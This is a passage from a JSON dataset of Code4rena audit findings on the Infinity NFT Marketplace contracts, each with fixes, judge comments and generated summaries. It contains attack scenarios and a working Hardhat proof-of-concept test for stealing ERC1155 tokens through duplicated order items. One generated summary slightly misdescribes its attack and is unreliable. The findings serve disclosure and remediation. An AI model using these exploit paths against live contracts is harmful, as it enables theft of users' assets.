([reference](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L833)), there is only one item actually gets traferred.\n\nThat means, the user, who barely know the implementation details of his NFTs, will pay the money for two items but just got one.\n\nNote that the situation of combining ERC721 and ERC1155 is prevalent and poses a great vulnerability of the exchange contract.\n\n### Proof of Concept\n\nCheck the return values of [Sandbox's ASSETs](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5)'s `supportInterface`, both `supportInterface(0x80ac58cd)` and `supportInterface(0xd9b67a26)` return true.\n\n### Recommended Mitigation Steps\n\nReorder the checks,e.g.,\n\n```solidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    }\n  }\n```\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1162965894):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760.\n\n**[HardlyDifficult commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1179595297):**\n > When an NFT supports both 721 & 1155 interfaces, the code prefers `_transferERC721s` - however this ignores the order's `numTokens`. This may result in under filling NFTs for an order, at the same cost to the buyer. The warden's recommendation would address this concern. Or maybe `_transferERC721s` could require `numTokens == 1`, but that approach would be limiting for this scenario. Since the buyer gets a fraction of what they paid for and it impacts a top20 1155, this seems to be a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the InfinityExchange smart contract, which could lead to users paying for more tokens than they receive. The bug affects tokens that support both ERC721 and ERC1155 standards, such as the asset token of The Sandbox Game. The vulnerability is caused by the code in the InfinityExchange contract, which first checks ERC721 interface supports and then ERC1155, leading to only one item being transferred instead of the expected two. The bug can be fixed by reordering the checks, so the ERC1155 check is first. This would ensure that the expected number of tokens is transferred.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/43",
      "tags": [
        "ERC1155",
        "supportsInterface",
        "ERC721"
      ],
      "finders": [
        "PwnedNoMore"
      ]
    },
    {
      "id": "2771",
      "title": "[H-05] Missing Complication check in `takeMultipleOneOrders`",
      "impact": "HIGH",
      "content": "_Submitted by shenwilly_\n\nAn order's type and it's rules are defined in it's `Complication`. Not checking it would allow anyone to take any orders regardless of their Complication's rule, causing unexpected execution for order makers.\n\n`takeMultipleOneOrders` assumes that all `makerOrders` are simple orderbook orders and the  Complication check is missing here.\n\n### Proof of Concept\n\n*   Alice signs a makerOrder with `PrivateSaleComplication`, allowing only Bob to take the private sale order.\n*   A malicious trader calls `takeMultipleOneOrders` to take Alice's order, despite the Complication only allowing Bob to take it.\n\n### Recommended Mitigation Steps\n\nAdd `canExecTakeOneOrder` function in IComplication.sol and implement it in `InfinityOrderBookComplication` (and future Complications) to support `takeMultipleOneOrders` operation, then modify `takeMultipleOneOrders` to use the check:\n\n    function takeMultipleOneOrders() {\n        ...\n        for (uint256 i = 0; i < numMakerOrders; ) {\n            bytes32 makerOrderHash = _hash(makerOrders[i]);\n            bool makerOrderValid = isOrderValid(makerOrders[i], makerOrderHash);\n            bool executionValid = IComplication(makerOrders[i].execParams[0]).canExecTakeOneOrder(makerOrders[i]);\n            \n            require(makerOrderValid && executionValid, 'order not verified');\n            \n            require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n            require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n            uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n            totalPrice += execPrice; // @audit-issue missing complication check\n            _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);\n            unchecked {\n                ++i;\n            }\n        }\n        ...\n    }\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/125#issuecomment-1162936193):**\n > fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/0b7608a2c9efc71d902a9c90f4731ef434b42c31.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/125#issuecomment-1179806203):**\n > `takeMultipleOneOrders` does not check restrictions set via the Complication. Agree with the High risk assessment here.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of a smart contract, namely InfinityExchange.sol, which is part of the code-423n4/2022-06-infinity repository. The vulnerability is related to the way orders are handled by the contract. Specifically, the contract does not check the Complication of an order, which is used to define its type and rules. This means that anyone can take any orders, regardless of the Complication, leading to unexpected execution of orders. \n\nThe Proof of Concept provided in the report shows that Alice signs a makerOrder with a PrivateSaleComplication, which should only allow Bob to take the private sale order. However, a malicious trader can call the takeMultipleOneOrders function to take Alice's order, despite the Complication only allowing Bob to take it.\n\nThe Recommended Mitigation Steps suggest that a canExecTakeOneOrder function should be added in IComplication.sol and implemented into InfinityOrderBookComplication and any future Complications. Additionally, the takeMultipleOneOrders function should be modified to use the check. \n\nIn summary, this bug report is about a vulnerability in the code of a smart contract, which allows anyone to take any orders regardless of their Complication rules, leading to unexpected execution of orders. The Recommended Mitigation Steps suggest the addition of a canExecTakeOneOrder function and modification of the takeMultipleOneOrders function to use this check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/125",
      "tags": [],
      "finders": [
        "shenwilly"
      ]
    },
    {
      "id": "2770",
      "title": "[H-04] Accumulated ETH fees of InfinityExchange cannot be retrieved",
      "impact": "HIGH",
      "content": "_Submitted by hyh, also found by 0x29A, 0xf15ers, 0xkowloon, 0xNineDec, berndartmueller, byterocket, cccz, codexploder, GreyArt, horsefacts, IllIllI, Kenshin, kenzo, KIntern, Lambda, obront, obtarian, oyc_109, peritoflores, rajatbeladiya, rfa, saian, unforgiven, WatchPug, Wayne, and zer0dot_\n\nETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations are permanently frozen within the contract as there is only one way designed to retrieve them, a rescueETH() function, and it will work as intended, not being able to access ETH balance of the contract.\n\nSetting the severity as high as the case is a violation of system's core logic and a permanent freeze of ETH revenue of the project.\n\n### Proof of Concept\n\nFees are accrued in user-facing takeOrders() and takeMultipleOneOrders() via the following call sequences:\n\n    takeOrders -> _takeOrders -> _execTakeOrders -> _transferNFTsAndFees -> _transferFees\n    takeMultipleOneOrders -> _execTakeOneOrder -> _transferNFTsAndFees -> _transferFees\n\nWhile token fees are transferred right away, ETH fees are kept with the InfinityExchange contract:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1119-L1141>\n\n```solidity\n  /**\n   * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is \n            the one that actually 'pays' the fees\n   * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferFees(\n    address seller,\n    address buyer,\n    uint256 amount,\n    address currency\n  ) internal {\n    // protocol fee\n    uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;\n    uint256 remainingAmount = amount - protocolFee;\n    // ETH\n    if (currency == address(0)) {\n      // transfer amount to seller\n      (bool sent, ) = seller.call{value: remainingAmount}('');\n      require(sent, 'failed to send ether to seller');\n```\n\ni.e. when `currency` is ETH the fee part of the amount, `protocolFee`, is left with the InfinityExchange contract.\n\nThe only way to retrieve ETH from the contract is rescueETH() function:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232>\n\n```solidity\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n    (bool sent, ) = destination.call{value: msg.value}('');\n    require(sent, 'failed');\n  }\n```\n\nHowever, it cannot reach ETH on the contract balance as `msg.value` is used as the amount to be sent over. I.e. only ETH attached to the rescueETH() call is transferred from `owner` to `destination`. ETH funds that InfinityExchange contract holds remain inaccessible.\n\n### Recommended Mitigation Steps\n\nConsider adding contract balance to the funds transferred:\n\n```solidity\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n-   (bool sent, ) = destination.call{value: msg.value}('');\n+   (bool sent, ) = destination.call{value: address(this).balance}('');\n    require(sent, 'failed');\n  }\n```\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/296)** \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/296#issuecomment-1179570179):**\n > When an order is filled using ETH, the exchange collects fees by holding them in the contract for later withdraw. However the only withdraw mechanism does not work so that ETH becomes trapped forever.\n> \n> This is a High risk issue since some ETH is lost with each ETH based trade.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the ETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations in the InfinityExchange contract. This vulnerability results in the permanent freezing of ETH revenue of the project, and the severity is set as high.\n\nThe ETH fees are kept with the InfinityExchange contract when the currency is ETH, and the only way to retrieve ETH from the contract is the rescueETH() function. However, the rescueETH() function cannot reach the ETH on the contract balance, as only ETH attached to the rescueETH() call is transferred. \n\nThe recommended mitigation steps include adding contract balance to the funds transferred. This will allow the rescueETH() function to access the ETH balance of the contract and prevent the permanent freezing of ETH revenue of the project.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/296",
      "tags": [],
      "finders": [
        "codexploder",
        "0xf15ers",
        "berndartmueller",
        "KIntern",
        "saian",
        "0x29A",
        "zer0dot_",
        "Wayne",
        "obtarian",
        "Lambda",
        "peritoflores",
        "oyc109",
        "Kenshin",
        "kenzo",
        "IllIllI",
        "GreyArt",
        "cccz",
        "WatchPug",
        "horsefacts",
        "0xNineDec",
        "rfa",
        "0xkowloon",
        "byterocket",
        "hyh",
        "unforgiven",
        "rajatbeladiya",
        "obront"
      ]
    },
    {
      "id": "2769",
      "title": "[H-03] `canExecTakeOrder` mismatches `makerOrder` and `takerItems` when duplicated items present",
      "impact": "HIGH",
      "content": "_Submitted by PwnedNoMore, also found by 0xsanson, hyh, k, throttle, and zzzitron_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243>\n\n### Impact\n\nWhen any user provides a `sellOrder` and they are trying to sell multiple tokens from *n* (n > 1) different `ERC1155` collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.\n\nIn short, hackers can violate the user-defined orders.\n\n### Root Cause\n\nThe logic of `canExecTakeOrder` and `canExecMatchOneToMany` is not correct.\n\n**Let's take ` canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)  ` as an example, while `canExecMatchOneToMany` shares the same error.**\n\nSpecifically, it first checks whether the number of selling item in `makerOrder` matches with the ones in `takerItems`. Note that the number is an aggregated one. Then, it check whether all the items in `takerItems` are within the scope defined by `makerOrder`.\n\nThe problem comes when there are duplicated items in `takerItems`. The aggregated number would be correct and all taker's Items are indeed in the order. However, it does not means `takerItems` exactly matches all items in `makerOrder`, which means violation of the order.\n\nFor example, if the order requires\n\n```\n[\n    {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n    },\n    {\n          collection: mock1155Contract2.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n    }\n];\n\n```\n\nand the taker provides\n\n    [\n        {\n              collection: mock1155Contract1.address,\n              tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n              collection: mock1155Contract1.address,\n              tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n    ];\n\nThe taker can grabs two `mock1155Contract1` tokens by paying the order which tries to sell a `mock1155Contract1` token and a `mock1155Contract2` token. When `mock1155Contract1` is much more expensive, the victim user will suffer from a huge loss.\n\nAs for the approving issue, the users may grant the contract unlimited access, or they may have another order which sells `mock1155Contract1` tokens. The attack is easy to perform.\n\n### Proof of Concept\n\nFirst put the `MockERC1155.sol` under the `contracts/` directory:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\nimport {ERC1155URIStorage} from '@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol';\nimport {ERC1155} from '@openzeppelin/contracts/token/ERC1155/ERC1155.sol';\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\n\ncontract MockERC1155 is ERC1155URIStorage, Ownable {\n  uint256 numMints;\n\n  constructor(string memory uri) ERC1155(uri) {}\n\n  function mint(address to, uint256 id, uint256 amount, bytes memory data) external onlyOwner {\n    super._mint(to, id, amount, data);\n  }\n}\n```\n\nAnd then put `poc.js` under the `test/` directory.\n\n```js\nconst { expect } = require('chai');\nconst { ethers, network } = require('hardhat');\nconst { deployContract, NULL_ADDRESS, nowSeconds } = require('../tasks/utils');\nconst {\n  getCurrentSignedOrderPrice,\n  approveERC20,\n  grantApprovals,\n  signOBOrder\n} = require('../helpers/orders');\n\nasync function prepare1155OBOrder(user, chainId, signer, order, infinityExchange) {\n  // grant approvals\n  const approvals = await grantApprovals(user, order, signer, infinityExchange.address);\n  if (!approvals) {\n    return undefined;\n  }\n\n  // sign order\n  const signedOBOrder = await signOBOrder(chainId, infinityExchange.address, order, signer);\n\n  const isSigValid = await infinityExchange.verifyOrderSig(signedOBOrder);\n  if (!isSigValid) {\n    console.error('Signature is invalid');\n    return undefined;\n  }\n  return signedOBOrder;\n}\n\ndescribe('PoC', function () {\n  let signers,\n    dev,\n    matchExecutor,\n    victim,\n    hacker,\n    token,\n    infinityExchange,\n    mock1155Contract1,\n    mock1155Contract2,\n    obComplication\n\n  const sellOrders = [];\n\n  let orderNonce = 0;\n\n  const UNIT = toBN(1e18);\n  const INITIAL_SUPPLY = toBN(1_000_000).mul(UNIT);\n\n  const totalNFTSupply = 100;\n  const numNFTsToTransfer = 50;\n  const numNFTsLeft = totalNFTSupply - numNFTsToTransfer;\n\n  function toBN(val) {\n    return ethers.BigNumber.from(val.toString());\n  }\n\n  before(async () => {\n    // signers\n    signers = await ethers.getSigners();\n    dev = signers[0];\n    matchExecutor = signers[1];\n    victim = signers[2];\n    hacker = signers[3];\n    // token\n    token = await deployContract('MockERC20', await ethers.getContractFactory('MockERC20'), signers[0]);\n\n    // NFT constracts (ERC1155)\n    mock1155Contract1 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [\n      'uri1'\n    ]);\n    mock1155Contract2 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [\n      'uri2'\n    ]);\n\n    // Exchange\n    infinityExchange = await deployContract(\n      'InfinityExchange',\n      await ethers.getContractFactory('InfinityExchange'),\n      dev,\n      [token.address, matchExecutor.address]\n    );\n\n    // OB complication\n    obComplication = await deployContract(\n      'InfinityOrderBookComplication',\n      await ethers.getContractFactory('InfinityOrderBookComplication'),\n      dev\n    );\n\n    // add currencies to registry\n    await infinityExchange.addCurrency(token.address);\n    await infinityExchange.addCurrency(NULL_ADDRESS);\n\n    // add complications to registry\n    await infinityExchange.addComplication(obComplication.address);\n\n    // send assets\n    await token.transfer(victim.address, INITIAL_SUPPLY.div(4).toString());\n    await token.transfer(hacker.address, INITIAL_SUPPLY.div(4).toString());\n    for (let i = 0; i < numNFTsToTransfer; i++) {\n      await mock1155Contract1.mint(victim.address, i, 50, '0x');\n      await mock1155Contract2.mint(victim.address, i, 50, '0x');\n    }\n  });\n\n  describe('StealERC1155ByDuplicateItems', () => {\n    it('Passed test denotes successful hack', async function () {\n      // prepare order\n      const user = {\n        address: victim.address\n      };\n      const chainId = network.config.chainId ?? 31337;\n      const nfts = [\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract2.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n      ];\n      const execParams = { complicationAddress: obComplication.address, currencyAddress: token.address };\n      const extraParams = {};\n      const nonce = ++orderNonce;\n      const orderId = ethers.utils.solidityKeccak256(['address', 'uint256', 'uint256'], [user.address, nonce, chainId]);\n      let numItems = 0;\n      for (const nft of nfts) {\n        numItems += nft.tokens.length;\n      }\n      const order = {\n        id: orderId,\n        chainId,\n        isSellOrder: true,\n        signerAddress: user.address,\n        numItems,\n        startPrice: ethers.utils.parseEther('1'),\n        endPrice: ethers.utils.parseEther('1'),\n        startTime: nowSeconds(),\n        endTime: nowSeconds().add(10 * 60),\n        nonce,\n        nfts,\n        execParams,\n        extraParams\n      };\n      const sellOrder = await prepare1155OBOrder(user, chainId, victim, order, infinityExchange);\n      expect(sellOrder).to.not.be.undefined;\n\n      // form matching nfts\n      const nfts_ = [\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n      ];\n\n      // approve currency\n      let salePrice = getCurrentSignedOrderPrice(sellOrder);\n      await approveERC20(hacker.address, token.address, salePrice, hacker, infinityExchange.address);\n\n      // perform exchange\n      await infinityExchange.connect(hacker).takeOrders([sellOrder], [nfts_]);\n\n      // owners after sale\n      // XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1\n      // When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge loss\n      expect(await mock1155Contract1.balanceOf(hacker.address, 0)).to.equal(2);\n    });\n  });\n});\n```\n\nAnd run\n\n```bash\n$ npx hardhat test --grep PoC\n\n  PoC\n    StealERC1155ByDuplicateItems\n      ✓ Passed test denotes successful hack\n```\n\nNote that the passed test denotes a successful hack.\n\n### Recommended Mitigation Steps\n\nI would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.\n\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/12#issuecomment-1162897771):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/bbbd362f18a2bb1992620a76e59621132b8a3d8c.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/12#issuecomment-1179560900):**\n> This is a High risk issue. The PoC demonstrates how a maker specifying a bundle of NFTs could incorrectly have one ERC1155 item in that bundle processed several times by the taker - the bundle is not fully accepted as expected, the item processed multiple times is essentially overfilled, and this may be abused to the taker's advantage when the NFTs are not valued the same.\n\n\n\n***\n\n",
      "summary": "\nThis bug report details a vulnerability in the InfinityExchange and InfinityOrderBookComplication contracts. The bug allows hackers to violate user-defined orders by providing a 'sellOrder' with multiple tokens from different ERC1155 collections in a single order. The flaw is in the logic of 'canExecTakeOrder' and 'canExecMatchOneToMany' which do not take into account duplicated items in the 'takerItems'. This could allow a hacker to pay for a single order, but receive multiple tokens from the most expensive collection. This can lead to a user suffering a huge loss. \n\nThe proof of concept code was tested with Hardhat and confirmed the vulnerability. Manual inspection was used as the tool. \n\nThe recommended mitigation step is to use a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/12",
      "tags": [],
      "finders": [
        "0xsanson",
        "k",
        "throttle",
        "zzzitron",
        "hyh",
        "PwnedNoMore"
      ]
    },
    {
      "id": "2768",
      "title": "[H-02] Loss of funds in `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` because code don't check that different ids in one collection are different, so it's possible to sell one id multiple time instead of selling multiple id one time in one collection of order (lack of checks in `doTokenIdsIntersect()` especially for ERC1155 tokens)",
      "impact": "HIGH",
      "content": "_Submitted by unforgiven_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L271-L312>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L59-L116>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L245-L294>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L118-L143>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L330-L364>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L934-L951>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L145-L164>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L171-L243>\n\n### Impact\n\nFunction `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` suppose to match `sell order` to `buy order` and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. but There is no check in their execution flow to check that an `order` has different `NFT token ids` in each one of it's collections, so even so number of tokens could be valid in `order` to `order` transfer but the number of real transferred tokens and their IDs can be different than what user specified and signed. and user funds would be lost. (because of `ERC1155` there can be more than one token for a `tokenId`, so it would be possible to transfer it)\n\n### Proof of Concept\n\nThis is `_takeOrders()` and `and` code:\n\n      /**\n       * @notice Internal helper function to take orders\n       * @dev verifies whether order can be executed\n       * @param makerOrder the maker order\n       * @param takerItems nfts to be transferred\n       * @param execPrice execution price\n       */\n      function _takeOrders(\n        OrderTypes.MakerOrder calldata makerOrder,\n        OrderTypes.OrderItem[] calldata takerItems,\n        uint256 execPrice\n      ) internal {\n        bytes32 makerOrderHash = _hash(makerOrder);\n        bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);\n        bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);\n        require(makerOrderValid && executionValid, 'order not verified');\n        _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);\n      }\n\nAs you can see it uses `canExecTakeOrder()` to check that it is valid to perform matching. This is `canExecTakeOrder()` and `areTakerNumItemsValid()` and `doTokenIdsIntersect()` code which are used in execution flow to check orders and matching validity:\n\n      /**\n       * @notice Checks whether take orders with a higher order intent can be executed\n       * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.\n              It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid\n              and whether the nfts intersect\n       * @param makerOrder the maker order\n       * @param takerItems the taker items specified by the taker\n       * @return returns whether order can be executed\n       */\n      function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n        external\n        view\n        override\n        returns (bool)\n      {\n        return (makerOrder.constraints[3] <= block.timestamp &&\n          makerOrder.constraints[4] >= block.timestamp &&\n          areTakerNumItemsValid(makerOrder, takerItems) &&\n          doItemsIntersect(makerOrder.nfts, takerItems));\n      }\n\n      /// @dev sanity check to make sure that a taker is specifying the right number of items\n      function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n        public\n        pure\n        returns (bool)\n      {\n        uint256 numTakerItems = 0;\n        uint256 nftsLength = takerItems.length;\n        for (uint256 i = 0; i < nftsLength; ) {\n          unchecked {\n            numTakerItems += takerItems[i].tokens.length;\n            ++i;\n          }\n        }\n        return makerOrder.constraints[0] == numTakerItems;\n      }\n\n      /**\n       * @notice Checks whether tokenIds intersect\n       * @dev This function checks whether there are intersecting tokenIds between two order items\n       * @param item1 first item\n       * @param item2 second item\n       * @return returns whether tokenIds intersect\n       */\n      function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)\n        public\n        pure\n        returns (bool)\n      {\n        uint256 item1TokensLength = item1.tokens.length;\n        uint256 item2TokensLength = item2.tokens.length;\n        // case where maker/taker didn't specify any tokenIds for this collection\n        if (item1TokensLength == 0 || item2TokensLength == 0) {\n          return true;\n        }\n        uint256 numTokenIdsPerCollMatched = 0;\n        for (uint256 k = 0; k < item2TokensLength; ) {\n          for (uint256 l = 0; l < item1TokensLength; ) {\n            if (\n              item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens\n            ) {\n              // increment numTokenIdsPerCollMatched\n              unchecked {\n                ++numTokenIdsPerCollMatched;\n              }\n              // short circuit\n              break;\n            }\n            unchecked {\n              ++l;\n            }\n          }\n          unchecked {\n            ++k;\n          }\n        }\n\n        return numTokenIdsPerCollMatched == item2TokensLength;\n      }\n\nAs you can see there is no logic to check that `token IDs` in one collection of order are different and code only checks that total number of tokens in one `order` matches the number of tokens specified and the ids in one order exists in other list defined. function `doTokenIdsIntersect()` checks to see that `tokens ids` in one collection can match list of specified tokens. because of this check lacking there are some scenarios that can cause fund lose for `ERC1155` tokens (normal `ERC721` requires more strange conditions). here is first example:\n\n1.  For simplicity, let's assume collection and timestamp are valid and match for orders and token is `ERC1155`\n2.  `user1` has signed this order: A:`(user1 BUY 3 NFT IDs[(1,1),(2,1),(3,1)] at 15 ETH)` (buy `1` token of each `id=1,2,3`)\n3.  `NFT ID[1]` fair price is `1 ETH`, `NFT ID[2]` fair price is `2 ETH`, `NFT ID[3]` fair price is `12 ETH`\n4.  `attacker` who has 3 of `NFT ID[1]` create this list: B:`(NFT IDs[(1,1), (1,1), (1,1)] )` (list to trade `1`token of `id=1` for 3 times)\n5.  Attacker call `takeOrders()` with this parameters: makerOrder: A , takerNfts: B\n6.  Contract logic would check all the conditions and validate and verify orders and their matching (they intersect and total number of token to sell is equal to total number of tokens to buy and all of the B list is inside A list) and perform the transaction.\n7.  `attacker` would receive `15 ETH` for his 3 token of `NFT ID[1]` and steal `user1` funds. `user1` would receive 3 of `NFT ID[1]` and pays `15 ETH` and even so his order A has been executed he doesn't receive `NFT IDs[(2,1),(3,1)]` and contract would violates his signed parameters.\n\nThis examples shows that in verifying one to many order code should verify that one order's one  collection's token ids are not duplicates. (the function `doTokenIdsIntersect()` doesn't check for this).\n\nThis scenario is performable to `matchOneToManyOrders()` and `matchOrders()` and but exists in their code (related check logics) too. more important things about this scenario is that it doesn't require off-chain maching engine to make mistake or malicious act, anyone can call `takeOrders()` if NFT tokens are `ERC1155`. for other `NFT` tokens to perform this attack it requires that `seller==buyer` or some other strange cases (like auto selling when receiving in one contract).\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nAdd checks to ensure `order`'s one `collection`'s token ids are not duplicate in `doTokenIdsIntersect()`\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/135#issuecomment-1162878540):**\n > Agree with assessment. Fixed. https://github.com/infinitydotxyz/exchange-contracts-v2/commit/c3c0684ac02e0cf1c03cdbee7e68c5a37fa334a8 and removed support for ERC1155\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/135#issuecomment-1179823515):**\n > This is an interesting scenario where the same NFT appears multiple times in a match and results in one order being under filled, leading to potential losses for the user. And the attack does not depend on the matching engine. Agree this is High risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a project called Infinity. This project is a decentralized exchange for trading Non-Fungible Tokens (NFTs). The bug is in the code of the function `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` which are used to match \"sell order\" to \"buy order\" and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. The problem is that there is no check in the code to verify that an order has different Non-Fungible Token (NFT) ids in each of its collections. This means that it is possible for a user to transfer the wrong tokens and lose funds.\n\nTo exploit this vulnerability, an attacker could create a list of tokens to trade (B) with the same NFT id but different numbers of tokens. They could then call the `takeOrders()` function with this list and the user's order (A). The code does not check that the NFT ids in the order are different, so the attacker would receive the funds from the user's order for the same NFT id but different numbers of tokens. The user would receive the wrong tokens and lose funds.\n\nThe recommended mitigation step is to add checks to the code to ensure that the order's one collection's token ids are not duplicates in the 